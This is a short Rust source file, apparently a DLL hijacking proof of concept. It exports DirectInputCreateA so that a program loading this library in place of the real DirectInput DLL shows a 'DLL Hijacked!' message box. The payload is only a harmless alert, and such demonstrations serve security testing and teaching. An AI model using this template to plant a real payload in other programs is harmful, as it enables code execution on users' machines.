use windows::{
    core::PCSTR,
    Win32::{
        Foundation::{BOOL, HANDLE, HWND},
        UI::WindowsAndMessaging::{MessageBoxA, MESSAGEBOX_STYLE},
    },
};

#[no_mangle]
extern "C" fn DirectInputCreateA() {
    unsafe {
        MessageBoxA(
            HWND(0),
            PCSTR("DLL Hijacked!\x00".as_ptr()),
            PCSTR("Uh oh\x00".as_ptr()),
            MESSAGEBOX_STYLE(0),
        );
    }
}
